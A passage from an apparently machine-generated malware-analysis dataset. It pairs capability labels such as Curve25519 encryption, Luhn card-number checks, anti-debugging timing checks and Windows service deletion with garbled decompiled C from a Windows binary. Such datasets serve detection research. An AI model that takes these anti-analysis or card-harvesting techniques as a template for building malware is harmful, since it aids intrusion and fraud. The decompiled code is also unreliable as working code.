int32_t **unaff_EDI;\n    int32_t **ppiVar13;\n    ushort in_SS;\n    bool bVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    uint8_t uVar16;\n    bool in_ZF;\n    uchar uVar17;\n    uchar uVar18;\n    uint8_t in_SF;\n    char cVar19;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar20;\n    char cVar21;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    unkbyte10 extraout_ST0;\n    ulong uVar22;\n    uint in_stack_ffffa15a;\n    uint in_stack_ffffa15e;\n    uint uVar23;\n    uint arg_14h;\n    uint *puVar24;\n    uint uStack24162;\n    uint in_stack_ffffffc9;\n    uint in_stack_ffffffcd;\n    uint32_t in_stack_ffffffd1;\n    \n    bVar20 = false;\n    if ((!in_ZF) && (in_ZF)) {\n        uVar7 = (in_IF & 1) * 0x200;\n        uVar3 = uVar7 | (in_TF & 1) * 0x100;\n        in_NT = ((in_NT & 1) * 0x4000 & 0x4000) != 0;\n        bVar20 = (uVar7 & 0x400) != 0;\n        in_IF = (uVar3 & 0x200) != 0;\n        in_TF = ((uVar3 | (in_SF & 1) * 0x80) & 0x100) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n        in_ID = (((in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000) & 0x200000) != 0;\n        in_AC = ((in_AC & 1) * 0x40000 & 0x40000) != 0;\n        in_VIP = 0;\n        in_VIF = 0;\n    }\n    do {\n        fcn.004011a0(0x4224f4, 0xb, 0x407024, 10);\n        in_stack_ffffffd1 = in_stack_ffffffd1 & 0xffffff | unaff_EDI << 0x18;\n        fcn.004011a0(0x4224f4, 0xb, 0x407030, 0x12);\n        uVar4 = fcn.004011a0(0x4224f4, 0xb, 0x407044, 4);\n        bVar14 = false;\n        cVar21 = '\\0';\n        uVar4 = uVar4 ^ unaff_EBX;\n        cVar19 = uVar4 < 0;\n        uVar17 = uVar4 == 0;\n        bVar15 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n        fcn.004011a0(0x4224f4, 0xb, 0x407048, 0xc);\n        if ((bVar15) || (!bVar15)) goto code_r0x00401cb2;\n        segment(in_SS, *0x10 + -0x1c);\n        if (bVar14) {\n            cVar21 = SCARRY1(*0xb7bc9eb0, extraout_CH);\n            *0xb7bc9eb0 = *0xb7bc9eb0 + extraout_CH;\n            cVar19 = *0xb7bc9eb0 < '\\0';\n            goto code_r0x00401cd7;\n        }\n    } while (bVar15);\n    cVar21 = '\\0';\n    cVar19 = &stack0xffffffe8 < 0;\n    uVar17 = *0x10 == 0x18;\ncode_r0x00401cb2:\n    fcn.004011a0(0x4224f4, 0xb, 0x407054, 7);\n    if ((!uVar17) && (uVar17)) {\n        cVar21 = SCARRY4(&stack0xffffffd4, 1);\n        cVar19 = &stack0xffffffd5 < 0;\n    }\n    in_stack_ffffffd1 = 0xb;\n    in_stack_ffffffcd = 0x40705c;\n    in_stack_ffffffc9 = 0xb;\ncode_r0x00401cd7:\n    piVar6 = fcn.004011a0(0x4224f4, in_stack_ffffffc9, in_stack_ffffffcd, in_stack_ffffffd1);\n    ppiVar13 = unaff_EDI;\n    if ((cVar21 == cVar19) && (cVar21 != cVar19)) {\n        out(0xc4, piVar6);\n        bVar20 = false;\n        ppiVar13 = unaff_EDI + 1;\n        *unaff_EDI = piVar6;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x407068, 0xc);\n    // WARNING: Bad instruction - Truncating control flow here\n    bVar14 = false;\n    bVar15 = (CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & ppiVar13) == 0;\n    uVar7 = fcn.004011a0(0x4224f4, 0xb, 0x407074, 8);\n    if ((!bVar15) && (bVar15)) {\n        unaff_EBX = unaff_EBX + 1;\n        if (bVar14 || unaff_EBX == 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        piVar6 = (uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar6 = *piVar6 - unaff_EBX;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x40707c, 0xd);\n    fcn.004011a0(0x4224f4, 0xb, 0x40708c, 0x18);\n    fcn.004011a0(0x4224f4, 0xb, 0x4070a4, 0x25);\n    fcn.004011a0(0x4224f4, 0xb, 0x4070cc, 10);\n    bVar14 = (POPCOUNT(extraout_DH & 0x12) & 1U) == 0;\n    piVar6 = unaff_ESI;\n    puVar24 = unaff_EBP;\n    fcn.004011a0(0x4224f4, 0xb, 0x4070d8, 0xc);\n    if ((bVar14) || (uVar23 = extraout_ECX,  !bVar14)) {\n        uVar23 = 0xd;\n        puVar24 = 0x4070e4;\n        piVar6 = 0xb;\n    }\n    *(extraout_EDX + 0xd) = *(extraout_EDX + 0xd) + -0x68;\n    in(0x70);\n    *(extraout_EDX + 0xb) = *(extraout_EDX + 0xb) + (extraout_ECX >> 8);\n    fcn.004011a0(0x4224f4, piVar6, puVar24, uVar23);\n    fcn.004011a0(0x4224f4, 0xb, 0x4070f4, 6);\n    fcn.004011a0(0x4224f4, 0xb, 0x4070fc, 5);\n    iVar5 = fcn.004011a0(0x4224f4, 0xb, 0x407104, 0xd);\n    bVar14 = iVar5 == -1;\n    fcn.004011a0(0x4224f4, 0xb, 0x407114, 0x19);\n    puVar24 = unaff_EBP;\n    if ((!bVar14) && (bVar14)) {\n        puVar12 = &stack0xffffffd5;\n        puVar24 = &stack0xffffffd5;\n        cVar19 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *unaff_EBP;\n            cVar19 = cVar19 + -1;\n        } while ('\\0' < cVar19);\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x407130, 0xf);\n    uVar22 = fcn.004011a0(0x4224f4, 0xb, 0x407140, 0xe);\n    piVar6 = uVar22 >> 0x20;\n    *(uVar22 + -0x7ce92414) = extraout_ST0;\n    uVar16 = 9 < (uVar22 - 1U & 0xf) | in_AF;\n    *piVar6 = *piVar6 + 0xb6adf84;\n    bVar14 = *piVar6 < 0;\n    uVar23 = 0x401f52;\n    uVar22 = fcn.004011a0(0x4224f4, 0xb, 0x407150, unaff_EBX);\n    if ((bVar14) || (!bVar14)) {\n        uVar23 = 0xb;\n        in_stack_ffffa15e = 0x40715c;\n        in_stack_ffffa15a = 0xb;\n    }\n    else {\n        pcVar8 = uVar22 + 0x5c680b6a;\n        if (!SCARRY4(uVar22, 0x5c680b6a)) {\n            *pcVar8 = *pcVar8 + pcVar8;\n            goto code_r0x00401f84;\n        }\n    }\n    puVar1 = (uVar22 >> 0x20) + 0xb;\n    bVar14 = CARRY1(*puVar1, extraout_CH_00);\n    *puVar1 = *puVar1 + extraout_CH_00;\n    fcn.004011a0(0x4224f4, in_stack_ffffa15a, in_stack_ffffa15e, uVar23);\n    if ((!bVar14) && (bVar14)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\ncode_r0x00401f84:\n    fcn.004011a0(0x4224f4, 0xb, 0x407168, 0xb);\n    fcn.004011a0(0x4224f4, 0xb, 0x407174, 10);\n    fcn.004011a0(0x4224f4, 0xb, 0x407180, 0xc);\n    bVar14 = (POPCOUNT((extraout_ECX_00 & 0xff) - extraout_EDX_00 & 0xff) & 1U) == 0;\n    arg_14h = 0xb;\n    uVar23 = 0x4224f4;\n    fcn.004011a0(0x4224f4, 0xb, 0x40718c, 0xe);\n    iVar9 = extraout_ECX_01;\n    iVar11 = extraout_EDX_01;\n    if (bVar14) goto code_r0x0040202e;\n    uVar10 = extraout_ECX_01 >> 8;\n    if (!bVar14) goto code_r0x0040202e;\n    puVar2 = extraout_EDX_01 + 0x11;\n    uVar7 = *puVar2;\n    uVar3 = *puVar2;\n    *puVar2 = *puVar2 - 0x68;\n    uVar7 = (in_NT & 1) * 0x4000 | SBORROW4(uVar3, 0x68) * 0x800 | bVar20 * 0x400 | (in_IF & 1) * 0x200 |\n            (in_TF & 1) * 0x100 | (*puVar2 < 0) * 0x80 | (*puVar2 == 0) * 0x40 | (uVar16 & 1) * 0x10 |\n            ((POPCOUNT(*puVar2 & 0xff) & 1U) == 0) * 4 | uVar7 < 0x68 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000\n            | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    if (SBORROW4(uVar3, 0x68)) {\n        while( true ) {\n            puVar1 = iVar11 + 0xb;\n            bVar14 = CARRY1(*puVar1, uVar10);\n            *puVar1 = *puVar1 + uVar10;\n            cVar19 = *puVar1 == 0;\n            uVar7 = 0x4224f4;\n            fcn.004011a0(0x4224f4, 0x4224f4, uVar23, arg_14h);\n            if ((bVar14) || (!bVar14)) break;\n            iVar9 = extraout_ECX_02 + -1;\n            iVar11 = extraout_EDX_02;\n            if (iVar9 == 0 || cVar19 == '\\0') {\n                iVar11 = *unaff_ESI;\n                *ppiVar13 = unaff_ESI + bVar20 * -2 + 1;\n                pcVar8 = *0x9750e2b5;\n                iVar11 = iVar11 >> 0x1f;\n                if (SCARRY4(puVar24, *(*0x9750e2b5 + -0x50)) != SCARRY4(puVar24 + *(*0x9750e2b5 + -0x50), bVar14))\n                goto code_r0x0040205e;\n                *iVar9 = iVar9;\n                *pcVar8 = *pcVar8 + pcVar8;\n                *0x6ab8ec1e = *0x6ab8ec1e + unaff_EBX;\n                uVar17 = 0;\n                goto code_r0x004020a3;\n            }\ncode_r0x0040202e:\n            uVar10 = iVar9 >> 8;\n        }\n        uVar7 = 0xb;\n        iVar9 = extraout_ECX_02;\n        iVar11 = extraout_EDX_02;\n    }\n    else {\n        in(extraout_EDX_01);\n    }\ncode_r0x0040205e:\n    *(iVar11 + 0xb) = *(iVar11 + 0xb) + (iVar9 >> 8);\n    fcn.004011a0(0x4224f4, uVar7, uVar23, arg_14h);\n    uVar17 = false;\n    uVar18 = ((extraout_CH_01 ^ extraout_AH) + 1 & 0x27) == 0;\n    fcn.004011a0(0x4224f4, 0xb, 0x4071c4, 0x14);\n    if ((!uVar17 && !uVar18) && (uVar17 || uVar18)) {\ncode_r0x004020a3:\n        uVar18 = *0x10 == 0x5e72;\n    }\n    uVar7 = fcn.004011a0(0x4224f4, 0xb, 0x4071d8, 0x33);\n    if ((!uVar17 && !uVar18) && (uVar17 || uVar18)) {\n        uVar17 = 0;\n        uVar18 = (uVar7 & 0xe2f4cc58) == 0;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x40720c, 10);\n    if ((!uVar17 && !uVar18) && (uVar17 || uVar18)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x407218, 4);\n    fcn.004011a0(0x4224f4, 0xb, 0x40721c, 5);\n    uVar17 = SBORROW4(extraout_ECX_03, 0x5354);\n    uVar23 = 0x4224f4;\n    fcn.004011a0(0x4224f4, 0xb, 0x407224, 6);\n    puVar24 = 0x4224f4;\n    fcn.004011a0(0x4224f4, 0xb, 0x407258, uVar23);\n    if ((!uVar17) && (uVar17)) {\n        *puVar24 = uStack24162;\n        return;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x407284, 0xb);\n    return;\n}\n",
        "token_count": 4432
    },
    "00404bf0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c04) overlaps instruction at (ram,0x00404c00)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00404bf0(int32_t param_1, char param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *unaff_EDI;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    puVar1 = (in_EAX | 0x8b) - 1;\n    *puVar1 = *puVar1 | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    pcVar2 = (in_EAX | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar3);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return uVar4;\n}\n",
        "token_count": 363
    },
    "00402880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402880(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404df0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407490;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "004028e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040293c) overlaps instruction at (ram,0x0040293a)\n// \n\nint32_t __cdecl fcn.004028e0(uint *arg_8h, uint16_t *arg_ch, uint *arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_ECX;\n    uint *extraout_ECX;\n    uint8_t *unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar2;\n    uint *unaff_EDI;\n    bool in_PF;\n    bool bVar3;\n    bool in_SF;\n    bool bVar4;\n    ulong uVar5;\n    uchar **ppuStack12;\n    int32_t iStack8;\n    \n    ppuStack12 = &stack0xfffffffc;\n    if ((in_SF) || (!in_SF)) {\n        in_ECX = arg_8h;\n        if (in_PF) goto code_r0x00402900;\n    }\n    else {\n        unaff_ESI = in_EAX + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n    }\n    arg_8h = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\ncode_r0x00402900:\n    bVar4 = false;\n    puVar2 = arg_10h;\n    iStack8 = unaff_ESI;\n    if (arg_10h != NULL) {\n        do {\n            cVar1 = arg_10h;\n            if ((bVar4) || (!bVar4)) {\n                cVar1 = arg_8h + *arg_ch >> 0x10;\n            }\n            *unaff_EDI = *puVar2;\n            bVar4 = CARRY1(cVar1 + 1U, *unaff_EBX);\n            bVar3 = cVar1 + 1U + *unaff_EBX == '\\0';\n            uVar5 = func_0xc0c58f3a();\n            arg_10h = uVar5;\n            arg_8h = extraout_ECX;\n            if (!bVar3) {\n                if ((!bVar4 && !bVar3) && (bVar4 || bVar3)) {\n                    *(unaff_EDI + 0x29) = *(unaff_EDI + 0x29) - &iStack8;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                arg_10h = (arg_10h & 0xffff) + (extraout_ECX & 0xffff);\n                arg_8h = arg_10h;\n            }\n            arg_ch = (uVar5 >> 0x20) + 2;\n            bVar4 = SBORROW4(puVar2 + 1, 1);\n            puVar2 = puVar2 + 3;\n            ppuStack12 = &ppuStack12;\n            unaff_EDI = unaff_EDI + 1;\n        } while (puVar2 != NULL);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 724
    },
    "00402d60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402d8c)\n// WARNING: Removing unreachable block (ram,0x00402d92)\n\nbool __cdecl fcn.00402d60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004027c0();\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 4);\n    do {\n        arg_ch_00 = fcn.00401170();\n        arg_ch_01 = fcn.00401170();\n        arg_ch_02 = fcn.00401170();\n        fcn.00403ea0(arg_10h, arg_ch_00);\n        fcn.00403ea0(arg_8h, arg_ch_01);\n        fcn.00403ea0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403500(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403500(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403500(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403ea0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 642
    },
    "004041c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404276)\n// WARNING: Removing unreachable block (ram,0x004041fc)\n\nuint64_t fcn.004041c0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint var_4h;\n    \n    pvData = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &var_4h);\n    if (iVar2 != 0) {\n        return 0;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return 0;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 != 6) {\n        return CONCAT14(iVar2 == 7, iVar2 == 7);\n    }\n    return 1;\n}\n",
        "token_count": 367
    },
    "00401740": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "write file on Windows",
            "get session user name"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040181d) overlaps instruction at (ram,0x0040181b)\n// \n\nuint fcn.00401740(uint param_1)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uint var_8h_2;\n    uint var_ch_2;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uchar *puVar2;\n    uint *puVar3;\n    uint auStack800 [65];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    puVar3 = &uStack16;\n    puVar2 = auStack540;\n    while( true ) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(puVar2, puVar3);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        uStack8 = 0x104;\n        uStack12 = 0x104;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                          (0, auStack540, auStack280, &uStack8, auStack800, &uStack12, auStack20);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if ((iVar1 < 1) || (0 < iVar1)) break;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(auStack280, var_8h_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        *(unaff_EBX + -0x6f3ca21b) = *(unaff_EBX + -0x6f3ca21b) + extraout_CL;\n        iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(var_8h_2, puVar2);\n        if (iVar1 != 0) {\n            (*_sym.imp.MSVCRT.dll_fwrite)(puVar3, 1, auStack800[0], iVar1);\n            (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n            (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 643
    },
    "004027c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402864) overlaps instruction at (ram,0x00402863)\n// \n// WARNING: Removing unreachable block (ram,0x00402820)\n// WARNING: Removing unreachable block (ram,0x00402856)\n// WARNING: Removing unreachable block (ram,0x00402864)\n// WARNING: Removing unreachable block (ram,0x0040285a)\n\nuint32_t __fastcall fcn.004027c0(uint32_t param_1)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    bool bVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    uVar3 = unaff_EDI & 0xffff | unaff_ESI << 0x10;\n    uVar5 = unaff_EBP & 0xffff;\n    puVar1 = param_1 & 0xffff;\n    while( true ) {\n        puVar6 = puVar1;\n        unaff_EDI = unaff_EDI & 0xffff0000 | uVar3 & 0xffff;\n        unaff_ESI = unaff_ESI & 0xffff0000 | uVar3 >> 0x10;\n        unaff_EBP = unaff_EBP & 0xffff0000 | uVar5 & 0xffff;\n        bVar4 = (POPCOUNT(*0x422524 & 0xff) & 1U) == 0;\n        if (*0x422524 != 0) {\n            return *0x422524;\n        }\n        if ((bVar4) || (!bVar4)) break;\n        segment(in_SS, *0x10 + -0xc);\n        if (!bVar4) break;\n        uVar3 = unaff_EDI;\n        uVar5 = unaff_ESI;\n        puVar1 = &stack0x00000004;\n        if (*0x422524 != 0) {\n            *0xb7bc9eb0 = *0xb7bc9eb0 + (puVar6 >> 8);\n            fcn.004011a0(0x4224f4, unaff_EDI, unaff_ESI, unaff_EBP);\n            uVar3 = fcn.004011a0(0x4224f4, 0xb, 0x407488, 8);\n            return uVar3;\n        }\n    }\n    uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n    uVar3 = (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n    *0x422524 = 1;\n    return uVar3;\n}\n",
        "token_count": 617
    },
    "00402820": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402864) overlaps instruction at (ram,0x00402863)\n// \n\nuint fcn.00402820(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    bool bVar2;\n    int32_t var_8h;\n    uint uVar3;\n    uint lpServiceName;\n    \n    bVar2 = false;\n    lpServiceName = 0;\n    uVar3 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar2) || (!bVar2)) {\n        iVar1 = var_8h;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar3 = fcn.00404100(uVar3, lpServiceName);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1 + -0x1bf31dd6);\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "00402b30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cfa) overlaps instruction at (ram,0x00402cf6)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __fastcall fcn.00402b30(uint16_t param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint16_t uVar8;\n    int32_t *unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *unaff_ESI;\n    int32_t *piVar11;\n    uchar *puVar12;\n    ushort in_SS;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    bool bVar15;\n    bool in_OF;\n    unkbyte10 in_ST0;\n    float10 in_ST1;\n    ushort uStack28;\n    uint16_t uStack24;\n    uint16_t uStack20;\n    \n    puVar10 = &stack0xfffffffc;\n    if ((!in_OF) && (in_OF)) {\n        LOCK();\n        unaff_ESI = 0x138b2633;\n    }\n    *param_3 = 0x11;\n    *(param_3 + 1) = 0x85;\n    uStack28 = SUB42(param_2, 0);\n    uVar8 = param_1 | 0x31fd;\n    bVar14 = uVar8 == 0;\n    *(param_3 + 2) = 0x5e;\n    if ((uVar8 < 0) || (uVar8 >= 0)) {\n        *(param_3 + 3) = 0x2b;\n        piVar4 = param_3;\n    }\n    else {\n        puVar10 = &stack0xfffffffc + *unaff_EBX;\n        bVar14 = puVar10 == NULL;\n        piVar4 = unaff_ESI;\n        unaff_ESI = param_3;\n        param_3 = param_3 + 1;\n    }\n    if ((bVar14) || (!bVar14)) {\n        *(param_3 + 1) = 0xeb;\n    }\n    else {\n        param_3 = CONCAT22(param_1, in_SS);\n        piVar4 = piVar4 & 0xffffff00 | piVar4 - 0x15;\n    }\n    *(param_3 + 5) = 0xa2;\n    bVar14 = (unaff_ESI | 0x561b) != param_2;\n    *(param_3 + 6) = 0x4b;\n    piVar11 = unaff_ESI;\n    if ((bVar14) && (!bVar14)) {\n        piVar4 = piVar4 & 0xffffff00 | *0x4bb148d3;\n        piVar11 = unaff_ESI + 1;\n        out(*unaff_ESI, uStack28);\n    }\n    *(param_3 + 7) = 0xd7;\n    uStack20 = piVar4;\n    *(param_3 + 2) = 0xcd;\n    *(param_3 + 9) = 0x8e;\n    uStack24 = piVar11 >> 0x10;\n    do {\n        puVar6 = piVar11 & 0xffff | uStack24 << 0x10;\n        *(param_3 + 10) = 0xe;\n        *(param_3 + 0xb) = 0x32;\n        uVar8 = param_1 + 1;\n        bVar14 = false;\n        bVar15 = ((uVar8 & 0xff | (uVar8 >> 8 & piVar4 + 2U) << 8) & 0x7bc9) == 0;\n        bVar13 = (POPCOUNT(uVar8 & 0xc9) & 1U) == 0;\n        *(param_3 + 3) = 0xb;\n        if ((!bVar13) && (bVar13)) {\n            puVar9 = &uStack20;\n            cVar2 = '\\x1e';\n            do {\n                puVar10 = puVar10 + -1;\n                puVar9 = puVar9 + -1;\n                *puVar9 = *puVar10;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar5 = in(0x78);\n            return CONCAT44(param_2, uVar5);\n        }\n        *(param_3 + 0xd) = 0x1f;\n        puVar12 = puVar6;\n        if ((bVar13) || (!bVar13)) goto code_r0x00402ce1;\n        puVar12 = *param_3;\n        *param_3 = puVar6;\n        puVar10 = puVar10 - *(puVar10 + 0x5f9dff63);\n        uStack24 = uStack20;\n    } while (puVar10 < 0);\n    bVar14 = puVar12 < 0;\n    bVar15 = puVar12 == NULL;\n    if (!bVar14) {\n        *piVar4 = *piVar4 + piVar4;\n        *piVar4 = *piVar4 + piVar4;\n        LOCK();\n        goto code_r0x00402d4d;\n    }\ncode_r0x00402ce1:\n    *(param_3 + 0xe) = 0xba;\n    if ((bVar14) || (!bVar14)) {\n        *(param_3 + 0xf) = 0x54;\n        if ((!bVar15) && (bVar15)) {\n            piVar4 = piVar4 & 0xffffff00 | *0x4bb148d3;\n            